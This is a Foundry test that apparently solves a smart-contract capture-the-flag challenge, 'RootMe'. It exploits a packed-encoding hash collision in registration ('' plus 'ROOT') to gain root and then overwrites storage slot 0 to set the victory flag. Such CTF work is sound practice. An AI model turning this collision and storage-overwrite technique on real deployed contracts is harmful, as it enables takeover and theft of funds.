// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import 'forge-std/Test.sol';
import { RootMe } from '../src/RootMe/RootMe.sol';

// interface RootMe {
//   function register(string memory username, string memory salt) external;
//   function write(bytes32 storageSlot, bytes32 data) external;
// }

contract RootMeTest is Test {
  address eoa = 0xD0CE7E521d26CAc35a7B10d31d6CCc7ffFF8B15e;
  address rootAddr;

  RootMe root;

  function setUp() public {
    vm.startPrank(eoa);
    root = new RootMe();
    rootAddr = root.getAddr();
  }

  function testAttack() public {
    root.register('', 'ROOT');
    root.write(0, keccak256(abi.encodePacked(true)));
    bool result = RootMe(root).victory();
    assertTrue(result == true);
  }
}
